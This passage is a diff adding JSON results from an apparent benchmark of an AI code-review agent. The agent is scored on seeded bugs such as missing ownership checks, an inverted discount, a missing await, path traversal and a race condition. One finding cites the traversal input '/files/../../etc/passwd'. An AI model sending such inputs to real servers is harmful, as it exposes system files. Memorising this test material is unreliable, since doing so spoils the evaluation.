+              "recommendation": "Verify that the invoice belongs to the current user before returning it, e.g. check `invoice.user_id == user.id` (or use an ownership-aware repository method) and raise 404/403 otherwise.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/invoices.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 15,
+                  "line_end": 19,
+                  "excerpt": "def get_invoice(invoice_id: int, user=Depends(current_user)) -> dict:\n    invoice = repo.get_invoice(invoice_id)\n    if invoice is None:\n        raise HTTPException(status_code=404, detail=\"Invoice not found\")\n    return invoice.to_dict()"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/api/invoices.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 11,
+                  "line_end": 11,
+                  "excerpt": "return [i.to_dict() for i in repo.invoices_for_user(user.id)]"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "inverted_bulk_discount",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 27995,
+          "prompt_tokens": 963,
+          "completion_tokens": 350,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "88c6a86c-1f5f-4724-945a-7a956a805134:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.98,
+              "file_path": "app/pricing.py",
+              "line_start": 14,
+              "line_end": 14,
+              "side": "RIGHT",
+              "title": "Inverted bulk discount condition",
+              "defect": "The condition 'quantity <= BULK_THRESHOLD' applies the bulk discount to small orders and prevents it for large orders, which is the opposite of the stated intent ('orders of 10 or more items get 5% off').",
+              "trigger": "An order with a quantity of 10 or more eligible for the bulk discount.",
+              "impact": "Large orders incorrectly receive no bulk discount, while smaller orders are incorrectly discounted.",
+              "recommendation": "Change the condition to 'if quantity >= BULK_THRESHOLD:'.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 9,
+                  "line_end": 9,
+                  "excerpt": "The better of the two applies, they do not stack."
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 14,
+                  "line_end": 14,
+                  "excerpt": "if quantity <= BULK_THRESHOLD:"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "missing_await_on_save",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 5420,
+          "prompt_tokens": 860,
+          "completion_tokens": 367,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "ec5f32b6-7efc-4023-a00e-b1ffbd6c268e:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/jobs.py",
+              "line_start": 13,
+              "line_end": 13,
+              "side": "RIGHT",
+              "title": "Missing await for async store.save call",
+              "defect": "The store.save() method is asynchronous, as indicated by the previous version using `await store.save(result)`. The new code calls `store.save(result)` without `await`, which returns a coroutine object instead of performing the save operation.",
+              "trigger": "Any invocation of record_result where the result has an id.",
+              "impact": "Review results are never actually saved to the store. The function returns an id but the data is not persisted, causing silent data loss. Additionally, Python will emit a RuntimeWarning about a coroutine being destroyed.",
+              "recommendation": "Restore the await keyword: `await store.save(result)`",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/jobs.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 13,
+                  "line_end": 13,
+                  "excerpt": "store.save(result)"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/jobs.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 7,
+                  "line_end": 7,
+                  "excerpt": "    await store.save(result)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "n_plus_one_order_report",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 21766,
+          "prompt_tokens": 941,
+          "completion_tokens": 12,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "off_by_one_pagination",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 719,
+          "prompt_tokens": 1019,
+          "completion_tokens": 293,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "43413ea9-07e0-49f0-abac-63b635945996:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 1.0,
+              "file_path": "src/pagination.py",
+              "line_start": 15,
+              "line_end": 17,
+              "side": "RIGHT",
+              "title": "Off-by-one pagination slice",
+              "defect": "The start offset is computed as `page * page_size` instead of `(page - 1) * page_size`, causing the first page to skip the first `page_size` items.",
+              "trigger": "Calling `paginate` with page 1 (e.g. via `first_page`).",
+              "impact": "The first `page_size` items are omitted from page 1 and the final items are truncated for later pages.",
+              "recommendation": "Use `start = (page - 1) * page_size`.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 15,
+                  "line_end": 15,
+                  "excerpt": "start = page * page_size"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "path_traversal_download",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 17595,
+          "prompt_tokens": 932,
+          "completion_tokens": 377,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "7b2f89a7-4707-49d4-9abc-15420b00e76f:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 0.95,
+              "file_path": "app/api/files.py",
+              "line_start": 18,
+              "line_end": 18,
+              "side": "RIGHT",
+              "title": "Path traversal vulnerability",
+              "defect": "`os.path.join` does not prevent directory traversal when `filename` contains `..` or absolute path segments, allowing the constructed path to escape `UPLOAD_DIR`.",
+              "trigger": "A request is made to `/files/../../etc/passwd` (or similar) causing `full_path` to resolve outside the intended upload directory.",
+              "impact": "An attacker can read arbitrary files accessible by the application user, which is a critical security breach.",
+              "recommendation": "Resolve the final path using `os.path.realpath(full_path)` and verify it starts with `os.path.realpath(UPLOAD_DIR) + os.sep`. Reject the request if the check fails.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/files.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 18,
+                  "line_end": 18,
+                  "excerpt": "full_path = os.path.join(UPLOAD_DIR, filename)"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/api/files.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 8,
+                  "line_end": 8,
+                  "excerpt": "UPLOAD_DIR = \"/srv/app/uploads\""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "race_condition_lost_update",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 16624,
+          "prompt_tokens": 1315,
+          "completion_tokens": 452,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "34eee0d1-4b39-4276-8268-9373086280fb:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/tic_tac_toe.py",
+              "line_start": 7,
+              "line_end": 13,
+              "side": "RIGHT",
+              "title": "Race condition on shared balance variable",
+              "defect": "The `balance_lock` is no longer used to protect the read-modify-write cycle of the shared `balance` variable inside the worker function, while `main` still runs multiple threads concurrently.",
+              "trigger": "Execution of `main()` with two threads concurrently calling the worker function in the same process.",
+              "impact": "Lost updates occur because another thread can read `balance` before the first thread writes its temporary result back; the final balance is likely much less than the expected sum of increments and the result is nondeterministic.",
+              "recommendation": "Restore mutual exclusion around the critical section (for example by re-introducing and using a `threading.Lock()` with `current_balance = balance; ...; balance = current_balance + 1`) or use an atomic increment primitive.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/tic_tac_toe.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 10,
+                  "line_end": 13,
+                  "excerpt": "current_balance = balance\ntime.sleep(0.000001)\nbalance = current_balance + 1"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/tic_tac_toe.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 19,
+                  "line_end": 20,
+                  "excerpt": "t1 = threading.Thread(target=deposit_money_bugged)\n        t2 = threading.Thread(target=deposit_money_bugged)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "tictactoe_final_design",
+          "repeat": 3,
+          "status": "failed",
+          "failure_code": "provider_error",
+          "duration_ms": 30787,
+          "prompt_tokens": 0,
+          "completion_tokens": 0,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "tictactoe_symbol_property",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 179,
+          "prompt_tokens": 757,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        }
+      ]
+    }
+  ]
+}
